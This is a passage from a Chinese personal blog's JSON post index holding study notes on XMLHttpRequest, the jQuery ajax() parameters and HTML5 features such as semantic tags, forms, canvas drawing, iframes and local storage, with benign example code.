4\r}\rxmlhttp.send();\rXMLHttpReques实例的属性\nXMLHttpRequest.readyState：该属性会返回一个XMLHttpRequest的状态，状态有5种，例如：\n状态0：已被实例化，但是未调用open()方法 状态1：open()方法已被调用（连接） 状态2：send()方法已被调用（请求） 状态3：请求处理中 状态4：请求完毕，且响应已就绪\nXMLHttpReques.onreadystatechange：该属性对应了一个回调函数，当XMLHttpRequest.readyState属性发生改变时，该回调函数就会被调用，例子如上面所示\nXMLHttpRequest.response：该属性会返回一个类型，该类型取决于XMLHttpRequest.responseType的值，类型例如：\nDOMString：当XMLHttpRequest.responseType的值为空字符串，那么就是DOMString类型（是一个utf-16字符串，默认）\narraybuffer：XMLHttpRequest.responseType的值为存储二进制数据的ArrayBuffer对象（该对象是用于存储二进制数据，不能直接进行操作，只能通过视图来进行操作）\nBlob：XMLHttpRequest.responseType的值为包含二进制数据的Blob对象（该对象是用于表示一个类似文件的对象，可以通过二进制的方式进行读取）\nDocument：值是一个Document\njson：值是一个JavaScript对象\ntext：值是一个DOMString对象表示的文本（utf-16字符串）\nXMLHttpRequest.responseText：该属性的值是请求被发送到服务端后，从服务端返回的文本，如果值为null，那么就是请求失败，如果为空字符串，那么就是没有send()\nXMLHttpRequest.responseType：该属性会返回一个值，该值和response属性的值一样\nXMLHttpRequest.responseURL：该属性会返回一个序列化url，如果url为空那么就返回空字符串\nXMLHttpRequest.responseXML：该属性返回Document(html/xml)，如果请求没有成功或者获取的数据，无法解析为html或者xml，那么为null\nXMLHttpRequest.status：该属性会返回响应中的http状态码，如果请求没有完成，那么值为0，如果出错也是为0\nXMLHttpRequest.timeout：该属性会返回一个值，该值为请求被自动终止前所消耗的毫秒数（默认为0，则表示没有超时）\nXMLHttpRequest.upload：该属性是用于表示上传的进度，可搭配事件监听器来追踪进度，例如：\nonloadstart：开始获取数据 onprogress：数据正在传输中 onabort：数据获取终止 onerror：数据获取失败 onload：数据获取成功 ontimeout：数据获取操作在规定的时间内未完成 onloadend：数据获取完成（不管是否成功）\nopen()方法\n该方法有3个常用参数，请求方式，请求url，是否异步执行（如果为false，那么JavaScript会等到服务器响应完毕时才会继续执行）\nxmlhttp.open(\u0026ldquo;GET\u0026rdquo;,\u0026ldquo;https://httpbin.org/get\u0026quot;,true)\n","permalink":"https://99999.fun/posts/14/","summary":"ajax请求是异步的，因此可以通过回调函数来处理响应\n实现ajax请求大多是使用XMLHttpRequest对象，该对象用于与服务器交互，可以在不刷新页面的情况下请求url，获取数据，从而达到更新页面内容的目的\n初始化XMLHttpRequest()构造函数，可以获得一个XMLHttpReques实例，例如：\nvar xmlhttp = new XMLHttpRequest()\rxmlhttp.onreadystatechange = function(){\rif(xmlhttp.readyState == 4 \u0026amp;\u0026amp; xmlhttp.status == 200){\rdocument.getElementById(\u0026quot;app\u0026quot;).innerHTML = xmlhttp.responseText\r}\r}\rconsole.log(xmlhttp.readyState) // 0\rxmlhttp.open(\u0026quot;GET\u0026quot;,\u0026quot;https://httpbin.org/get\u0026quot;,true)\rconsole.log(xmlhttp.readyState) // 1\rxmlhttp.onprogress =function(){\rconsole.log(xmlhttp.readyState) // 3\r}\rxmlhttp.onload = function(){\rconsole.log(xmlhttp.readyState) // 4\r}\rxmlhttp.send();\rXMLHttpReques实例的属性\nXMLHttpRequest.readyState：该属性会返回一个XMLHttpRequest的状态，状态有5种，例如：\n状态0：已被实例化，但是未调用open()方法 状态1：open()方法已被调用（连接） 状态2：send()方法已被调用（请求） 状态3：请求处理中 状态4：请求完毕，且响应已就绪\nXMLHttpReques.onreadystatechange：该属性对应了一个回调函数，当XMLHttpRequest.readyState属性发生改变时，该回调函数就会被调用，例子如上面所示\nXMLHttpRequest.response：该属性会返回一个类型，该类型取决于XMLHttpRequest.responseType的值，类型例如：\nDOMString：当XMLHttpRequest.responseType的值为空字符串，那么就是DOMString类型（是一个utf-16字符串，默认）\narraybuffer：XMLHttpRequest.responseType的值为存储二进制数据的ArrayBuffer对象（该对象是用于存储二进制数据，不能直接进行操作，只能通过视图来进行操作）\nBlob：XMLHttpRequest.responseType的值为包含二进制数据的Blob对象（该对象是用于表示一个类似文件的对象，可以通过二进制的方式进行读取）\nDocument：值是一个Document\njson：值是一个JavaScript对象\ntext：值是一个DOMString对象表示的文本（utf-16字符串）\nXMLHttpRequest.responseText：该属性的值是请求被发送到服务端后，从服务端返回的文本，如果值为null，那么就是请求失败，如果为空字符串，那么就是没有send()\nXMLHttpRequest.responseType：该属性会返回一个值，该值和response属性的值一样\nXMLHttpRequest.responseURL：该属性会返回一个序列化url，如果url为空那么就返回空字符串\nXMLHttpRequest.responseXML：该属性返回Document(html/xml)，如果请求没有成功或者获取的数据，无法解析为html或者xml，那么为null\nXMLHttpRequest.status：该属性会返回响应中的http状态码，如果请求没有完成，那么值为0，如果出错也是为0\nXMLHttpRequest.timeout：该属性会返回一个值，该值为请求被自动终止前所消耗的毫秒数（默认为0，则表示没有超时）\nXMLHttpRequest.upload：该属性是用于表示上传的进度，可搭配事件监听器来追踪进度，例如：\nonloadstart：开始获取数据 onprogress：数据正在传输中 onabort：数据获取终止 onerror：数据获取失败 onload：数据获取成功 ontimeout：数据获取操作在规定的时间内未完成 onloadend：数据获取完成（不管是否成功）","title":"JavaScript-XMLHttpRequest对象笔记"},{"content":"ajax()是jQuery中定义的一个方法，该方法用于执行ajax请求，例如：\n$(document).ready(function(){\r$(\u0026quot;button\u0026quot;).click(function(){\r$.ajax({\rtype: \u0026quot;GET\u0026quot;,\rurl: \u0026quot;https://httpbin.org/get\u0026quot;,\rsuccess: function(getdata){\rconsole.log(getdata)\r}\r})\r})\r});\r参数\nurl：指定发送请求的URL，默认是当前页面\ntype：指定请求方式（GET或者POST）\nsuccess：当请求成功时执行的函数\ndata：指定要发送到服务端的数据\ndataType：预期服务端响应过来的数据类型\nasync：指定请求是否异步（布尔值）\nbeforeSend：在发送请求之前执行的函数\ncache：指定客户端是否缓存被请求页面，默认是true（布尔值）\ncomplete：在请求完成时执行的函数（不管是否发送成功）\ncontentType：指定要发送到服务端时使用的内容类型\ncontext：指定所有ajax相关的回调函数规定this值\ndataFilter：指定用于处理ajax返回的原始响应数据的函数\nerror：指定请求失败时执行的函数\nglobal：指定请求是否触发全局ajax事件，默认为true\nifModified：指定是否在最后一次请求\njsonp：指定一个jsonp请求中重写回调函数的字符串\njsonpCallback：指定一个jsonp回调函数的名称\nprocessData：指定是否将请求发送的数据转换为查询字符串，默认为true\nscriptCharset：指定请求的字符集\ntimeout：指定请求超时时间（单位：毫秒）\ntraditional：指定是否使用传统的方式来序列化数据\nusername：指定响应http访问认证请求的用户名\npassword：指定响应http访问认证请求的密码\nxhr：用于重写或者增强XMLHttpRequest对象的函数\n","permalink":"https://99999.fun/posts/13/","summary":"ajax()是jQuery中定义的一个方法，该方法用于执行ajax请求，例如：\n$(document).ready(function(){\r$(\u0026quot;button\u0026quot;).click(function(){\r$.ajax({\rtype: \u0026quot;GET\u0026quot;,\rurl: \u0026quot;https://httpbin.org/get\u0026quot;,\rsuccess: function(getdata){\rconsole.log(getdata)\r}\r})\r})\r});\r参数\nurl：指定发送请求的URL，默认是当前页面\ntype：指定请求方式（GET或者POST）\nsuccess：当请求成功时执行的函数\ndata：指定要发送到服务端的数据\ndataType：预期服务端响应过来的数据类型\nasync：指定请求是否异步（布尔值）\nbeforeSend：在发送请求之前执行的函数\ncache：指定客户端是否缓存被请求页面，默认是true（布尔值）\ncomplete：在请求完成时执行的函数（不管是否发送成功）\ncontentType：指定要发送到服务端时使用的内容类型\ncontext：指定所有ajax相关的回调函数规定this值\ndataFilter：指定用于处理ajax返回的原始响应数据的函数\nerror：指定请求失败时执行的函数\nglobal：指定请求是否触发全局ajax事件，默认为true\nifModified：指定是否在最后一次请求\njsonp：指定一个jsonp请求中重写回调函数的字符串\njsonpCallback：指定一个jsonp回调函数的名称\nprocessData：指定是否将请求发送的数据转换为查询字符串，默认为true\nscriptCharset：指定请求的字符集\ntimeout：指定请求超时时间（单位：毫秒）\ntraditional：指定是否使用传统的方式来序列化数据\nusername：指定响应http访问认证请求的用户名\npassword：指定响应http访问认证请求的密码\nxhr：用于重写或者增强XMLHttpRequest对象的函数","title":"jQuery-ajax()方法笔记"},{"content":"HTML5是HTML标准的第5代标准，主要目的是语义化并且提供多媒体的嵌入\nHTML是什么？HTML全称为HyperTextMarkupLanguage，中文叫超文本标记语言，简称HTML\n而HTML5是一个标准，指的是第五代HTML标准\nHTML5主要的新特性：\n语义特性，本地存储特性，设备兼容特性，连接特性，网页多媒体特性，性能与集成特性，CSS3特性\nHTML的块级与行级\n块级元素的特征：\n独占一行，不和其他元素待在同一行上，能设置宽和高\n默认宽度是该元素的容器的100%，不过可以设置宽度\n常用的块级元素有div，ul，li，dl，dt，h1-h6\n行级元素的特征：\n可以和其他元素待在同一行上，不能设置宽和高\n它的宽度就是它的文字或者图片的宽度\n常用的行级元素有a，span\n行内块级元素的特征：\n可以设置宽和高，可以一行多个\n常见的行内块级元素有input，img\n转换元素为块级或者行内\ndisplay：block //定义元素为块级元素\ndisplay: inline //定义元素为行内元素\ndisplay：inline-block //定义元素为行内块级元素。\n这三个的区别只有三个，排列分式，设置宽高，默认宽度\nhtml语义\n语义化：使得页面可以很好的向浏览器和开发者描述其意义\n语义化的好处：\n方便开发团队的前期开发和后期维护，不只是作用于自己的开发团队，也方便其他国家的开发者能理解网页的结构；\n在css文件丢失的情况下，也能表示出好的内容结构和代码结构，方便用户阅读；\n方便辅助技术能更好的阅读或者转译网页，方便有障碍人士阅读；\n良好的结构和语义，可以提高搜索引擎爬虫的有效爬取；\n重点：用正确的标签做正确的事！！！\n要注意可以改变样式的标签不一定是有居于语义的\n在没有出现语义元素前，几乎都是使用div或者span，加类加id\n没有语义的元素最适合当容器使用了\n常用的非语义元素有\u0026lt;div\u0026gt;和\u0026lt;span\u0026gt;\r常用的语义元素有\u0026lt;header\u0026gt;和\u0026lt;footer\u0026gt;\r\u0026lt;header\u0026gt;：页眉，一般包括网站logo，主导航，搜索框等；\r\u0026lt;nav\u0026gt;：导航，链接；\r\u0026lt;main\u0026gt;：定义文章的主要内容，一个页面只能使用一次；\r\u0026lt;article\u0026gt;：定义一份独立的内容，脱离其他内容或者其他部分，独立于文档的其余部分；\r\u0026lt;section\u0026gt;：定义内容的节（段）；\r\u0026lt;footer\u0026gt;：页脚，一般包含版权信息或者链接等；\r\u0026lt;aside\u0026gt;：侧边栏，一般作为附属信息，例如导航索引，广告等；\rmeta viewport\nviewport 是指 web 页面上的可见区域\n\u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;width=device-width, initial-scale=1.0\u0026quot;\u0026gt;\rdevice-width指设备的理想宽度,不同的设备 device-width 是不一样的\nnitial-scale=1.0 是指默认缩放大小是1，也就是默认不缩放\nmaximum-scale=1.0 是指最大缩放大小是1\n标签使用\u0026lt;和\u0026gt;括起来，例如\u0026lt;div\u0026gt;\nhtml标签大多都是成对出现的，分开始标签和结束标签，结束标签比开始标签多了个/\n例如： html不区分大小写。所以\u0026lt;DIV\u0026gt;和\u0026lt;div\u0026gt;作用一样。建议使用小写\n\u0026lt;!DOCTYPE html\u0026gt;声明这是一个html5文件，声明位于\u0026lt;html\u0026gt;前面\r\u0026lt;html\u0026gt; 标识HTML文档的开始\r\u0026lt;head\u0026gt;表明一些和html文档有关的信息，例如title\r\u0026lt;body\u0026gt;html文档的主体\r\u0026lt;!--这是一个注释--\u0026gt;\r段落\n\u0026lt;span\u0026gt;\u0026lt;span\u0026gt;\r\u0026lt;h1\u0026gt;~\u0026lt;h6\u0026gt;\r\u0026lt;div\u0026gt;\u0026lt;/div\r定义头部区域\u0026lt;header\u0026gt;\r定义底部区域\u0026lt;footer\u0026gt;\r定义区段\u0026lt;section\u0026gt;\r定义侧边栏区域\u0026lt;aside\u0026gt;\r换行\u0026lt;br\u0026gt;\r文本输入框 \u0026lt;input\u0026gt;\rselect+option 选择列表\n多媒体元素（video和audio）\n例如：\n\u0026lt;video src=\u0026quot;hallo.mp4\u0026quot; controls autoplay=\u0026quot;autoplay\u0026quot; loop\u0026gt;\u0026lt;/video\u0026gt;\r\u0026lt;audio src=\u0026quot;hallo.mp3\u0026quot; controls autoplay=\u0026quot;autoplay\u0026quot; loop\u0026gt;\u0026lt;/audio\u0026gt;\rcontrols属性是显示控制栏，autoplay属性是自动播放，loop属性是循环播放\n注意：video元素支持的视频格式有mp4，ogg，webm，不过每个格式在不同浏览器内核兼容性不一样\nsource标签就完美解决这个问题，例如：\n\u0026lt;video\u0026gt;\r\u0026lt;source src=\u0026quot;hallo.mp4\u0026quot;\u0026gt;\r\u0026lt;source src=\u0026quot;hallo.ogg\u0026quot;\u0026gt;\r\u0026lt;source src=\u0026quot;hallo.WebM\u0026quot;\u0026gt;\r\u0026lt;/video\u0026gt;\r播放顺序是如果第一个支持就是只播放第一个，如果第一个不支持，第二个支持，就播放第二个\n表单控件可以控制输入内容必须为指定合法的数据，例如：\n\u0026lt;form\u0026gt;\t邮箱地址：\r\u0026lt;input type=\u0026quot;email\u0026quot;\u0026gt;\r\u0026lt;/form\u0026gt;\rtype新的属性值有：\nemail：邮箱地址\nurl：网址\nnumber：数字\ncolor：拾色器\ntime：时，分\nweek：周\nmonth：月\ndate：年，月，日\ndatetime-local：年，月，日，时，分，秒\nrange：滑块\nform的一些属性\nautocomplete：该属性可以实现自动输入功能，浏览器基于之前输入并且提交过的值，属性值有on和off\nnovalidate：该属性是是否关闭校验，搭配表单控件食用更佳\ninput的一些属性\nautofocus：自动获取焦点\nplaceholder：提示信息（占位符）\nrequired：必填项\nlist：带本地数据缓存列表的自动输入，例如\n\u0026lt;form\u0026gt;\r\u0026lt;input type=\u0026quot;url\u0026quot; list=\u0026quot;url_list\u0026quot; name=\u0026quot;link\u0026quot;/\u0026gt;\r\u0026lt;datalist id=\u0026quot;url_list\u0026quot;\u0026gt;\r\u0026lt;option label=\u0026quot;blog\u0026quot; value=\u0026quot;https://xiaochenabc123.test.com\u0026quot; /\u0026gt;\r\u0026lt;option label=\u0026quot;baidu\u0026quot; value=\u0026quot;https://www.baidu.com\u0026quot; /\u0026gt;\r\u0026lt;option label=\u0026quot;github\u0026quot; value=\u0026quot;https://www.github.com\u0026quot; /\u0026gt;\r\u0026lt;/datalist\u0026gt;\r\u0026lt;input type=\u0026quot;submit\u0026quot; /\u0026gt;\r\u0026lt;/form\u0026gt;\rmultiple：多选项\n如果一个表单不被form元素包含，但是又想提交过去，那么可以指定该input元素的form属性值为form元素的id\ncanvas元素用于图形的绘制，该元素只是一个容器，还需要js来绘制，例如：\n\u0026lt;canvas width=\u0026quot;300px\u0026quot; height=\u0026quot;300px\u0026quot;\u0026gt;\u0026lt;/canvas\u0026gt;\r\u0026lt;style\u0026gt;\rcanvas{\rborder: 1px solid #000;\r}\r\u0026lt;/style\u0026gt;\r\u0026lt;script\u0026gt;\r//获取dom对象\rvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\r//获取绘图上下文\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.fillStyle=\u0026quot;#000\u0026quot;;\rctx.fillRect(0,0,100,100);\r// Canvas坐标是二维的，代表左上角的坐标为0,0\r\u0026lt;/script\u0026gt;\rcanvas画线，提供了两个方法moveTo()和lineTo()，例如:\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.moveTo(100, 100); // 线条开始坐标\rctx.lineTo(200, 100); // 线条结束坐标\rctx.stroke(); // 绘制\r画圆圈：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.beginPath();\rctx.arc(100,100,80,0,2*Math.PI,false); // 圆心的坐标（x，y），半径，开始弧度，结束弧度，方向(默认为false顺时针,true代表逆时针)\rctx.stroke();\r以圆心为中心向右（3点方向）为0度角，顺时针为正，逆时针为负\n1角度=π/180度，1弧度=180度/π,一个圆有360度，也就是说一个圆是2弧度\n30度=π/6,60度=π/3,90度=π/2,180度=π,360度=2π，依此类推\nx坐标 = 圆心的横坐标+圆的半径*cos(弧度)\ny坐标 = 圆心的纵坐标+圆的半径*sin(弧度)\n画三角形\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.moveTo(10, 10);\rctx.lineTo(10, 100);\rctx.lineTo(70, 100);\rctx.closePath(); // 闭合\rctx.stroke();\rctx.fillStyle=\u0026quot;#ccc\u0026quot;; // 填充颜色\rctx.fill();\r平移(坐标系圆点的平移)\ntranslate(x,y)\n注意：translate不能只设置一个值(除非使用translateX或者translateY进行单独设置值)，和moveTo()的区别就是moveTo是修改开始绘制的位置，圆点位置没有改变，而translate是改变圆点位置，例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.translate(100,100);\rctx.fillStyle=\u0026quot;gray\u0026quot;;\rctx.fillRect(50,50,100,50);\r旋转\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.translate(100, 100);\rctx.rotate(Math.PI/6);\rctx.moveTo(0, 0);\rctx.lineTo(200, 0);\rctx.lineTo(0, 100);\rctx.stroke();\r缩放\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.translate(300,200);\rctx.scale(0.3, 0.5); // x轴和y轴缩放倍数，例如0.3，0.5\rctx.arc(10,10,200,0,2*Math.PI);\rctx.stroke();\r线与线之间链接的方式，主要用到lineJoin属性，属性值有miter（尖角，默认），bevel（斜角），round（圆角），例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.lineWidth=10; // 线的宽度\rctx.lineJoin=\u0026quot;bevel\u0026quot;; // 线与线的链接方式\rctx.moveTo(80, 80); // 线条开始坐标\rctx.lineTo(200, 130); // 线条结束坐标\rctx.lineTo(150, 30);\rctx.stroke(); // 绘制\r线帽\n主要实现方式就是使用lineCap()属性，例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.lineWidth=10;\rctx.lineCap=\u0026quot;round\u0026quot;;\rctx.moveTo(50,50);\rctx.lineTo(200,50);\rctx.stroke();\r该属性有三个值，分别是butt（默认），round（圆形线帽），square（正方形线帽）\nbutt和square的区别就是，square（round也是）会导致线条变长一点\nctx.beginPath(); // 设置新的画布\n非零环绕\n如果想画一个不规则的图形，然后填充颜色，那么怎么知道那里该填色那里不填色呢，那么就是需要用到一个叫非零环绕的数学方法，实现原理很简单，描绘路径一笔完成就可以了，例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.arc(120,120,80,0,2*Math.PI,false); // .arc()方法中最后一个参数是设置路径方向的\rctx.arc(120,120,100,0,2*Math.PI,true);\rctx.stroke();\rctx.fillStyle=\u0026quot;#ccc\u0026quot;; // 填充颜色\rctx.fill();\r非零环绕：\n以点为圆心,绘制一条射线,以射线为半径顺时针旋转,相交的边同向记为+1,反方向记为-1,如果相加的区域等于0,则不填充,非零区域填充\n例如：假设一个点，以这个点绘制一条射线，如果这个射线和这个点的一条路径正方向相交，则为+1，或者再有一个点，如果这个点和这个点的一条路径正方向，但是又有一条路径是反方向相交的，那么就是+1-1，那么就是0，只要结果不是0，那么射线所在的区域就是在外面，不填充\n线性渐变\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rvar clg=ctx.createLinearGradient(0,0,200,0);\rclg.addColorStop(0,\u0026quot;red\u0026quot;);\rclg.addColorStop(1,\u0026quot;black\u0026quot;);\rctx.lineWidth=\u0026quot;50\u0026quot;;\rctx.strokeStyle=clg;\rctx.moveTo(100, 100); ctx.lineTo(200, 100); ctx.stroke(); createLinearGradient()有4个参数，分别代表渐变开始的xy坐标，渐变结束的xy坐标\naddColorStop()方法，第一个参数是设置开始和结束或者中间的周期，第二个参数是颜色\n0代表开始，1表示结束，中间颜色可以使用小数来设置\n径向渐变 var canvas =document.querySelector(\u0026ldquo;canvas\u0026rdquo;); var ctx=canvas.getContext(\u0026ldquo;2d\u0026rdquo;); var clg=ctx.createRadialGradient(200,200,100,120,120,100); clg.addColorStop(0,\u0026ldquo;black\u0026rdquo;); clg.addColorStop(1,\u0026ldquo;red\u0026rdquo;); ctx.fillStyle=clg; ctx.moveTo(50, 50); ctx.lineTo(300, 100); ctx.lineTo(300, 300); ctx.lineTo(100, 300); ctx.lineTo(50, 50); ctx.closePath(); ctx.fill();\ncreateRadialGradient()中有6个参数，分别代表径向渐变开始的xy坐标，渐变开始的半径，向渐变结束的xy坐标，渐变结束的半径\n虚线就是实线和空白区域之间的空白距离\nsetLineDash()，参数是一个数组，如果数组中有两个值，那么就是分别代表实线长度，空白长度，如果是三个值，那么就是分别代表实线，空白，实线\u0026hellip;\n例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.moveTo(100, 100);\rctx.lineTo(300, 150);\rctx.setLineDash([10,3,15]);\rctx.stroke();\r绘制动画\n动画确实就是绘制一个图形，清除这个图形，然后在另一个地方绘制图形，达到这个图形好像在动的错觉\n清除图形用到clearRect()，例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rvar x=0; // 初始位置\rvar abc=10; // 每次移动多少像素\rvar i=1; // 改变方向，做到一来一回的效果\rsetInterval(function(){\r// 定时器\rctx.clearRect(0, 0, canvas.width, canvas.height); // 清除\rctx.fillRect(x, 120, 120, 180); // 绘制新的图形\rx+=abc*i; // 处理，实质上x是移动的位置变化，x=x+abc*i\rif(x\u0026gt;canvas.width-120){\ri=-1;\r}else if(x\u0026lt;0){\ri=1;\r// i的值为1时为正方向移动，为-1时为反方向移动，将值做成互为相反数来达到效果\r}\r},30);\r绘制文本\n绘制文本有两个方法，fillText()实体文字，strokeText()镂空文字，例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rctx.textAlign=\u0026quot;center\u0026quot;; // 文本水平对齐方式,left,right,center\rctx.font=\u0026quot;30px 宋体\u0026quot;; // 文本大小与字体\rctx.textBaseline=\u0026quot;middle\u0026quot;; // 文字垂直对齐方式,alphabetic(默认),top,middle,bottom,hanging,ideographic\rctx.shadowColor=\u0026quot;gray\u0026quot;; // 文本阴影颜色\rctx.shadowOffsetX=3; // 文字阴影的水平偏移量\rctx.shadowOffsetY=3; // 文字阴影的垂直偏移量\rctx.shadowBlur=6; // 设置文字阴影的模糊度\rctx.strokeText(\u0026quot;hallo word\u0026quot;, 200, 200); // 文本内容，x，y\rctx.fillText(\u0026quot;hallo word\u0026quot;, 200, 200);\r绘制图片\n例如：\nvar canvas =document.querySelector(\u0026quot;canvas\u0026quot;);\rvar ctx=canvas.getContext(\u0026quot;2d\u0026quot;);\rvar img=document.createElement(\u0026quot;img\u0026quot;); // 创建一个img\rimg.src=\u0026quot;hallo.jpg\u0026quot;; // 图片位置\rimg.onload=function(){\rctx.drawImage(img,100,100); // 图片对象，x，y\r}\r图片设置宽度高度\nctx.drawImage(img,100,100,200,200); // 图片对象，x，y，宽度，高度\r将图片绘制到矩形区域内的指定位置\nctx.drawImage(img,100,100,200,200,0,0,300,300); // 图片对象，图片绘制到矩形的位置xy，图片的高度和宽度，图片矩形的位置，图片矩形的高度和宽度\r解决图片比例不正常：\n要满足：绘制的图片宽度：绘制的图片高度等于原始图片宽度：原始高度\n那么就是说绘制的图片宽度等于绘制的图片高度乘以原始图片宽度除以原始高度，依此类推，保证绘制的图片宽高比例和原来图片的比例宽高一致\niframe框架\n用于在网页中显示网页\n\u0026lt;iframe src=\u0026quot;https://xiaochenabc123.test.com\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\r可以设置高度和宽度\nframeborder=\u0026ldquo;0\u0026rdquo; // 可以移除边框\n可以设置target属性来做目标\ntarget属性：浏览器会在指定文件中寻找对应的name，并且寻找到对应name的href属性\n\u0026lt;iframe src=\u0026quot;index.html\u0026quot; name=\u0026quot;iframe_a\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\r\u0026lt;a href=\u0026quot;https://xiaochenabc123.test.com\u0026quot; target=\u0026quot;iframe_a\u0026quot;\u0026gt;hallo\u0026lt;/a\u0026gt;\rdefer属性规定了执行延迟，当页面加载完毕就执行，不用再担心DOM元素获取不了，例如：\n\u0026lt;script type=\u0026quot;text/javascript\u0026quot; defer=\u0026quot;defer\u0026quot;\u0026gt;\rconsole.log(\u0026quot;hallo word\u0026quot;)\r\u0026lt;/script\u0026gt;\r无论这句话防止哪里，都会等到页面加载完毕（dom渲染完毕后）才会执行\n本地存储\nlocalStorage是用键值对来进行本地存储，localStorage方法是window方法下的\n存储\nlocalStorage.setItem(\u0026ldquo;root\u0026rdquo;,\u0026ldquo;123\u0026rdquo;)\n读取\nlet abc = localStorage.getItem(\u0026ldquo;root\u0026rdquo;)\n删除\nlocalStorage.removeItem(\u0026ldquo;root\u0026rdquo;)\n例如:\nfunction onAdd(){\rif (localStorage.clickcount) {\rlocalStorage.clickcount = Number(localStorage.clickcount) + 1\r} else {\rlocalStorage.clickcount = 1\r}\rdocument.getElementById(\u0026quot;root\u0026quot;).innerHTML = \u0026quot;当前点击数：\u0026quot; + localStorage.clickcount + \u0026quot;次\u0026quot;\r}\r...\r\u0026lt;button onclick=\u0026quot;onAdd()\u0026quot; type=\u0026quot;button\u0026quot;\u0026gt;点击\u0026lt;/button\u0026gt;\r\u0026lt;div id=\u0026quot;root\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\r注意：localStorage会永久存储，一直到手动删除，如果想保存在当前会话的话使用sessionStorage更好，该会在关闭页面的时候同时也销毁这些数据\nsessionStorage也是window方法下的\n存储\nsessionStorage.setItem(\u0026ldquo;root\u0026rdquo;, \u0026ldquo;123\u0026rdquo;)\n读取\nlet abc = sessionStorage.getItem(\u0026ldquo;root\u0026rdquo;)\n删除\nsessionStorage.removeItem(\u0026ldquo;root\u0026rdquo;)\n删除全部数据\nsessionStorage.clear()\nCache Manifest是HTML5的一种缓存机制，用来缓存应用，让其在无网络的情况下还能访问\n启动Cache Manifest也很简单，直接在html元素上使用manifest属性，属性值是manifest文件\nW3C建议文件扩展名为.appcache\nmanifest文件格式\nCACHE MANIFEST /main.js /logo.jpg NETWORK: test.html FALLBACK: /archives /404.html\n上面表示/main.js和/logo.jpg将被缓存，哪怕断开连接，都是可用的，test.html不被缓存，如果不能连接网络，archives目录将被404.html覆盖\n注意：应用被缓存，那么就会被一直缓存下去，一直到清空缓存，manifest文件被修改才会重新从互联网上获取最新的数据\n离线存储是通过manifest文件来管理的，还需要服务器端的支持，因为这里是nginx服务器，因此修改mime.types文件，添加manifest文件映射\n添加\ntext/cache-manifest appcache;\r然后重启nginx服务器\n例如：\n\u0026lt;html manifest=\u0026quot;demo.appcache\u0026quot;\u0026gt;\r\u0026lt;body\u0026gt;离线缓存\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rDOCTYPE是声明浏览器应该使用哪种规范解析，因为HTML5不是基于SGML（标准通用标记语言），所以不需要DTD，而HTML4.01是基于SGML，所以才需要引用DTD，XHTML是严格版本的HTML，必须正确嵌套，闭合，以及区分大小写\nDTD(Document Type Definition, 文档类型定义)是一套用来定义html或者xhtml，以及xml的文件类型的语法语法规则，浏览器根据dtd来判断文件类型，使用哪种模式来说解析\niframe\niframe会堵塞页面的加载事件（onload）(只有当全部iframe标签都加载完毕才会触发该事件)，还存在连接池问题（部分老版本浏览器限制同一个域名多开连接，页面和iframe共享连接池），而且搜索引擎无法爬取该页面，如果需要使用，请尽量保证iframe存在src属性\n","permalink":"https://99999.fun/posts/12/","summary":"HTML5是HTML标准的第5代标准，主要目的是语义化并且提供多媒体的嵌入\nHTML是什么？HTML全称为HyperTextMarkupLanguage，中文叫超文本标记语言，简称HTML\n而HTML5是一个标准，指的是第五代HTML标准\nHTML5主要的新特性：\n语义特性，本地存储特性，设备兼容特性，连接特性，网页多媒体特性，性能与集成特性，CSS3特性\nHTML的块级与行级\n块级元素的特征：\n独占一行，不和其他元素待在同一行上，能设置宽和高\n默认宽度是该元素的容器的100%，不过可以设置宽度\n常用的块级元素有div，ul，li，dl，dt，h1-h6\n行级元素的特征：\n可以和其他元素待在同一行上，不能设置宽和高\n它的宽度就是它的文字或者图片的宽度\n常用的行级元素有a，span\n行内块级元素的特征：\n可以设置宽和高，可以一行多个\n常见的行内块级元素有input，img\n转换元素为块级或者行内\ndisplay：block //定义元素为块级元素\ndisplay: inline //定义元素为行内元素\ndisplay：inline-block 